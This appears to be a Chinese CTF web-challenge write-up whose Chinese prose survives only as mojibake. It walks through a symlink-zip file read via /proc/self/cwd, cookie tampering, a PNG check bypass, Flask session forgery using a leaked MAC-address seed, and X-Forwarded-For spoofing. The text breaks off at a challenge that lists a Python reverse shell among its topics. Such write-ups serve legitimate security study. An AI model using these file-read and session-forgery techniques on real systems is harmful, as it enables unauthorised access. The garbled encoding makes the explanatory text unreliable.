<span class="token keyword">def</span> <span class="token function">showflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token boolean">True</span> <span class="token operator">==</span> <span class="token boolean">False</span><span class="token punctuation">:</span>
        image <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">'./flag/flag.jpg'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">&quot;rb&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
        resp <span class="token operator">=</span> make_response<span class="token punctuation">(</span>image<span class="token punctuation">)</span>
        resp<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Content-Type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'image/png'</span>
        <span class="token keyword">return</span> resp
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">&quot;can't give you&quot;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br><span class="line-number">75</span><br><span class="line-number">76</span><br><span class="line-number">77</span><br><span class="line-number">78</span><br><span class="line-number">79</span><br><span class="line-number">80</span><br><span class="line-number">81</span><br><span class="line-number">82</span><br><span class="line-number">83</span><br><span class="line-number">84</span><br><span class="line-number">85</span><br><span class="line-number">86</span><br><span class="line-number">87</span><br><span class="line-number">88</span><br><span class="line-number">89</span><br><span class="line-number">90</span><br><span class="line-number">91</span><br><span class="line-number">92</span><br><span class="line-number">93</span><br><span class="line-number">94</span><br></div></div><p>è½¯é“¾æ¥æ”»å‡»</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>ln -s /proc/self/cwd/flag/flag.jpg 123
// flag.jpgå†å½“å‰flaskç›®å½•ä¸‹çš„flagç›®å½•ä¸‹ï¼Œæƒ³è¦è¯»å–åˆ°flag.jpgï¼Œæˆ‘ä»¬å¿…é¡»çŸ¥é“flaskçš„è¿è¡Œç›®å½•åœ¨å“ªé‡Œ
// /proc/selfè®°å½•ç³»ç»Ÿè¿è¡Œçš„ä¿¡æ¯ï¼Œcwdè®°å½•å½“å‰è¿›ç¨‹è¿è¡Œç›®å½•çš„ä¸€ä¸ªç¬¦å·é“¾æ¥ï¼Œ/proc/self/cwdå°±è®°å½•äº†å½“å‰flaskè¿è¡Œç›®å½•
// ln -s xxx 123 ï¼šå°†123ä½œä¸ºæŒ‡å‘xxxçš„è½¯é“¾æ¥

zip -ry 123.zip 123
// zip -y ï¼š ç›´æ¥ä¿å­˜ç¬¦å·è¿æ¥ï¼Œè€Œéè¯¥è¿æ¥æ‰€æŒ‡å‘çš„æ–‡ä»¶ã€‚
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200719073112.png" alt="image-20200719073112191"></p> <p>å°†æˆ‘ä»¬å¾—åˆ°çš„zipæ–‡ä»¶ä¸Šä¼ ï¼Œåœ¨bpä¸­å³å¯æ‹¿åˆ°flag</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200719073536.png" alt="image-20200719073447920"></p> <h3 id="cookie-store"><a href="#cookie-store" class="header-anchor">#</a> Cookie Store</h3> <p><strong>è€ƒç‚¹ï¼š</strong></p> <ul><li><strong>sessionä¼ªé€ </strong></li></ul> <p>100å—é’±ä¹°flagï¼Œæˆ‘ä»¬åªæœ‰50å—é’±ï¼Œçœ‹äº†ä¸€ä¸‹cookieï¼Œç›´æ¥base64è§£ç æ”¹ä¸€ä¸‹é’±ï¼Œç„¶åå†æ”¹ä¸€ä¸‹cookieå°±å¯ä»¥äº†</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200719103844.png" alt="image-20200719103844429"></p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200719103912.png" alt="image-20200719103912179"></p> <h3 id="avatar-uploader-1"><a href="#avatar-uploader-1" class="header-anchor">#</a> Avatar Uploader 1</h3> <p><strong>è€ƒç‚¹ï¼š</strong></p> <ul><li><strong>getimagesize()å’Œfinfo_file()çš„æ‰§è¡Œå·®å¼‚</strong></li></ul> <p>é¢˜ç›®ç›´æ¥ç»™äº†æºç ï¼Œå…³é”®éƒ¨åˆ†ä»£ç å¦‚ä¸‹ï¼š</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code>//upload.php

<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'config.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'util.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'session.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$session</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SecureClientSession</span><span class="token punctuation">(</span><span class="token constant">CLIENT_SESSION_ID</span><span class="token punctuation">,</span> <span class="token constant">SECRET_KEY</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// check whether file is uploaded</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">error</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'No file was uploaded.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">// check file size</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'size'</span><span class="token punctuation">]</span> <span class="token operator">&gt;</span> <span class="token number">256000</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">error</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Uploaded file is too large.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">// check file type</span>
<span class="token variable">$finfo</span> <span class="token operator">=</span> <span class="token function">finfo_open</span><span class="token punctuation">(</span><span class="token constant">FILEINFO_MIME_TYPE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$type</span> <span class="token operator">=</span> <span class="token function">finfo_file</span><span class="token punctuation">(</span><span class="token variable">$finfo</span><span class="token punctuation">,</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">finfo_close</span><span class="token punctuation">(</span><span class="token variable">$finfo</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token single-quoted-string string">'image/png'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">error</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Uploaded file is not PNG format.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">// check file width/height</span>
<span class="token variable">$size</span> <span class="token operator">=</span> <span class="token function">getimagesize</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$size</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&gt;</span> <span class="token number">256</span> <span class="token operator">||</span> <span class="token variable">$size</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&gt;</span> <span class="token number">256</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">error</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Uploaded image is too large.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$size</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token constant">IMAGETYPE_PNG</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// I hope this never happens...</span>
  <span class="token function">error</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'What happened...? OK, the flag for part 1 is: &lt;code&gt;'</span> <span class="token punctuation">.</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'FLAG1'</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'&lt;/code&gt;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">// ok</span>
<span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span>random_bytes<span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'.png'</span><span class="token punctuation">;</span>
<span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">UPLOAD_DIR</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$session</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'avatar'</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">flash</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'info'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'Your avatar has been successfully updated!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">redirect</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span></code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br></div></div><p>ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡ï¼Œåˆ†åˆ«ç”¨finfo_file()å’Œgetimagesize()è¿›è¡Œä¸¤æ¬¡æ£€æµ‹ï¼Œç¬¬ä¸€å±‚çš„finfo_file()æ£€æµ‹æ–‡ä»¶çš„mimeç±»å‹å¿…é¡»æ˜¯image/pngï¼Œç¬¬äºŒå±‚çš„imagesize()æ£€æµ‹å¦‚æœæ–‡ä»¶çš„åç¼€åä¸æ˜¯pngå°±ä¼šç»™å‡ºflagã€‚</p> <p>ä¸¤æ¬¡æ£€æµ‹çœ‹ä¼¼çŸ›ç›¾ï¼Œä½†æ˜¯å¯ä»¥åˆ©ç”¨ä¸¤ä¸ªå‡½æ•°çš„æ‰§è¡Œå·®å¼‚æ¥è¿›è¡Œç»•è¿‡ï¼š</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200720213013.png" alt="image-20200720213013305"></p> <p>å¯¹äºè¿™ç§åœ¨åå…­è¿›åˆ¶æŸ¥çœ‹å™¨ä¸­çš„åªæœ‰ä¸€è¡Œçš„PNGæ–‡ä»¶ï¼Œä½¿ç”¨finfo_file()å‡½æ•°ä¼šæ£€æµ‹å‡ºmimeç±»å‹ä¸ºimage/pngï¼Œä½†æ˜¯getimagesize()å‡½æ•°å´æ— æ³•æ£€æµ‹å…¶ç±»å‹ï¼Œæœ¬åœ°æµ‹è¯•å¦‚ä¸‹ï¼š</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200720213447.png" alt="image-20200720213447062"></p> <p>ä¸Šä¼ è¯¥æ–‡ä»¶ï¼Œæ‹¿åˆ°flagï¼š</p> <img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200720213818.png" alt="image-20200720213818562"> <p><strong>Tips:</strong></p> <ul><li><strong>è¿™ä¸¤ä¸ªå‡½æ•°å¯¹äºæ–‡ä»¶åç¼€åçš„æ£€æµ‹éƒ½æ˜¯åŸºäºæ–‡ä»¶åå…­è¿›åˆ¶å†…å®¹çš„æ£€æµ‹ï¼Œæ‰€ä»¥ä¸€ä¸ªæ­£å¸¸çš„pngæ–‡ä»¶å•çº¯ä¿®æ”¹æ–‡ä»¶åæ˜¯æ— æ³•è¿›è¡Œç»•è¿‡çš„ï¼Œæœ¬åœ°æµ‹è¯•å¦‚ä¸‹ï¼š</strong></li></ul> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200720213741.png" alt="image-20200720213739229"></p> <p>å¯ä»¥çœ‹åˆ°ï¼Œå°½ç®¡ä¿®æ”¹ä¹‹åçš„æ–‡ä»¶åç¼€åä¸ºjpgï¼Œä½†æ˜¯ç»è¿‡å‡½æ•°å¤„ç†ä¹‹åçš„mimeç±»å‹ä»ç„¶æ˜¯image/pngã€‚</p> <h3 id="ciscn2019-åä¸œå—èµ›åŒº-web4"><a href="#ciscn2019-åä¸œå—èµ›åŒº-web4" class="header-anchor">#</a> [CISCN2019 åä¸œå—èµ›åŒº]Web4</h3> <p><strong>è€ƒç‚¹ï¼š</strong></p> <ul><li><strong>flask sessionä¼ªé€ </strong></li> <li><strong>Linuxç³»ç»ŸçŸ¥è¯†</strong></li> <li><strong>ä»»æ„æ–‡ä»¶è¯»å–</strong></li> <li><strong>ä¼ªéšæœºæ•°</strong></li></ul> <p>è¿›å…¥é¢˜ç›®ï¼Œç‚¹å‡»Read somethingsï¼š</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200727210152.png" alt="image-20200727210152300"></p> <p>çœ‹è·¯ç”±å¾ˆåƒflaskï¼Œå¹¶ä¸”å­˜åœ¨urlå‚æ•°ï¼Œå¯èƒ½é€ æˆä»»æ„æ–‡ä»¶è¯»å–ï¼Œç”¨local_file://åè®®è¯»ä¸€ä¸‹ï¼š</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200727210350.png" alt="image-20200727210350494"></p> <p>è¯»å–æˆåŠŸï¼Œå¦å¤–åœ¨<strong>python3ä¸‹local_file://åè®®å¯ä»¥çœç•¥ï¼Œç›´æ¥å†™æ–‡ä»¶åå¯ä»¥å¯ä»¥è¯»å–çš„ã€‚</strong></p> <p>è¯»ä¸€ä¸‹æºç ï¼š</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200727212241.png" alt="image-20200727210622961"></p> <p>æºç å¦‚ä¸‹ï¼š</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token comment"># encoding:utf-8</span>
<span class="token keyword">import</span> re<span class="token punctuation">,</span> random<span class="token punctuation">,</span> uuid<span class="token punctuation">,</span> urllib
<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> session<span class="token punctuation">,</span> request

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>getnode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>random<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">233</span><span class="token punctuation">)</span>
app<span class="token punctuation">.</span>debug <span class="token operator">=</span> <span class="token boolean">True</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'www-data'</span>
    <span class="token keyword">return</span> <span class="token string">'Hello World! &lt;a href=&quot;/read?url=https://baidu.com&quot;&gt;Read somethings&lt;/a&gt;'</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/read'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        url <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'url'</span><span class="token punctuation">)</span>
        m <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'^file.*'</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> re<span class="token punctuation">.</span>IGNORECASE<span class="token punctuation">)</span>
        n <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> re<span class="token punctuation">.</span>IGNORECASE<span class="token punctuation">)</span>
        <span class="token keyword">if</span> m <span class="token keyword">or</span> n<span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token string">'No Hack'</span>
        res <span class="token operator">=</span> urllib<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
        <span class="token keyword">return</span> res<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> ex<span class="token punctuation">:</span>
        <span class="token keyword">print</span> <span class="token builtin">str</span><span class="token punctuation">(</span>ex<span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token string">'no response'</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> session <span class="token keyword">and</span> session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'fuck'</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">'Access denied'</span>

<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>
        debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
        host<span class="token operator">=</span><span class="token string">&quot;0.0.0.0&quot;</span>
    <span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br></div></div><p>åœ¨flagè·¯ç”±ä¸‹ï¼Œåªæœ‰sessionä¸­çš„username = fuckï¼Œæ‰å¯ä»¥å¾—åˆ°flagï¼Œä¼°è®¡åˆæ˜¯è€ƒflaskçš„sessionä¼ªé€ ã€‚</p> <p>è€å¥—è·¯ï¼Œçœ‹ä¸€ä¸‹æœ‰æ— æ³„æ¼secret_keyï¼š</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200727212259.png" alt="image-20200727210827575"></p> <ul><li>uuid.getnode()ï¼šè·å–å½“å‰ç³»ç»Ÿçš„MACåœ°å€ï¼Œè¿”å›å€¼æ˜¯åè¿›åˆ¶</li></ul> <p>ä»¥MACåœ°å€ä½œä¸ºéšæœºæ•°çš„ç§å­ï¼Œæ—¢ç„¶éšæœºæ•°çš„ç§å­æ˜¯å›ºå®šçš„ï¼Œé‚£ä¹ˆç”Ÿæˆçš„éšæœºæ•°ä¹Ÿæ˜¯æœ‰è§„å¾‹çš„ï¼Œæ‰€ä»¥secret_keyæ˜¯å¯ä»¥å¾—å‡ºæ¥çš„ã€‚</p> <ul><li>Linuxçš„MACåœ°å€å­˜å‚¨ä½ç½®ï¼š/sys/class/net/eth0/address</li></ul> <p>è¯»ä¸€ä¸‹MACåœ°å€ï¼š</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200727211129.png" alt="image-20200727211129851"></p> <ul><li><p>åå…­è¿›åˆ¶ï¼š02:42:ae:02:89:3c -&gt; 0x0242ae02893c</p></li> <li><p>å¯¹åº”åè¿›åˆ¶ï¼š2485410498876</p></li></ul> <p>å†™è„šæœ¬æ¥è·å–éšæœºæ•°(py2ç¯å¢ƒ)ï¼š</p> <img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200727212315.png" alt="image-20200727211938423" style="zoom:50%;"> <p>åˆ©ç”¨å¾—åˆ°çš„éšæœºæ•°æ¥è§£ç sessionï¼š</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200727212021.png" alt="image-20200727212021464"></p> <p>å†ä¼ªé€ seesionï¼š</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200727212148.png" alt="image-20200727212148684"></p> <p>æ”¹ä¸€ä¸‹cookieï¼Œæ‹¿åˆ°flagï¼š</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200727212207.png" alt="image-20200727212207683"></p> <h3 id="pywebsite"><a href="#pywebsite" class="header-anchor">#</a> PYWebsite</h3> <p><strong>è€ƒç‚¹ï¼š</strong></p> <ul><li><strong>XFFå¤´IPä¼ªé€ </strong></li></ul> <p>ä¹°flagå‘ç°è¦æˆæƒç ï¼ŒF12ä¸€ä¸‹å‘ç°æˆæƒç æ˜¯å‰ç«¯éªŒè¯çš„ï¼ŒéªŒè¯æˆåŠŸä¹‹åä¼šè·³è½¬åˆ°./flag.php</p> <img src="https://i.loli.net/2020/07/30/hSZLbtfpAeqYMTH.png" alt="image-20200730145534334" style="zoom:80%;"> <p>é‚£æˆ‘ä»¬å°±æ‰‹åŠ¨è·³è½¬å§2333</p> <img src="https://i.loli.net/2020/07/30/7iJHIMRUz8metdg.png" alt="image-20200730145630326" style="zoom:33%;"> <p>è®°å½•äº†è´­ä¹°è€…å’Œè‡ªå·±çš„IPï¼Œå¾ˆæ˜æ˜¾çš„XFFå¤´ä¼ªé€ é¢˜ç›®äº†ï¼Œç›´æ¥ä¼ªé€ 127.0.0.1å°±èƒ½æ‹¿åˆ°flag</p> <img src="https://i.loli.net/2020/07/30/8NBzthf1IHsErxc.png" alt="image-20200730145753180" style="zoom:50%;"> <h3 id="v-n2020-å…¬å¼€èµ›-checkin"><a href="#v-n2020-å…¬å¼€èµ›-checkin" class="header-anchor">#</a> [V&amp;N2020 å…¬å¼€èµ›]CHECKIN</h3> <p><strong>è€ƒç‚¹ï¼š</strong></p> <ul><li><strong>Linuxæ¢å¤è¯¯åˆ æ–‡ä»¶</strong></li> <li><strong>pythonåå¼¹shell</strong></li></ul> <p>**çŸ¥è¯†ç‚¹ï¼šåœ¨Linuxç³»ç»Ÿä¸‹ï¼Œå¦‚æœæ‰“å¼€äº†ä¸€ä¸ªæ–‡ä»¶æ²¡æœ‰å…³é—­çš„è¯ï¼Œå³ä½¿å°†æ–‡ä»¶åˆ 